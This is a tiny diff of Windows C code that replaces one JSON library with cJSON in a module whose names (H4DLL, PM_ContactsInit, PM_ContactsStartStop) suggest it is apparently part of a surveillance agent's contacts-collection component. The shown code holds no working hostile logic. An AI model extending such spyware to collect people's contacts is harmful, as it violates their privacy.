@@ -2,7 +2,7 @@
 
 #include <Windows.h>
 #include <stdio.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/LOG.h"
 #include "../../H4DLL/H4-DLL.h"
@@ -257,7 +257,7 @@ DWORD WINAPI PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_ContactsInit(JSONObject elem)
+DWORD WINAPI PM_ContactsInit(cJSON *elem)
 {
 	return 1;
 }
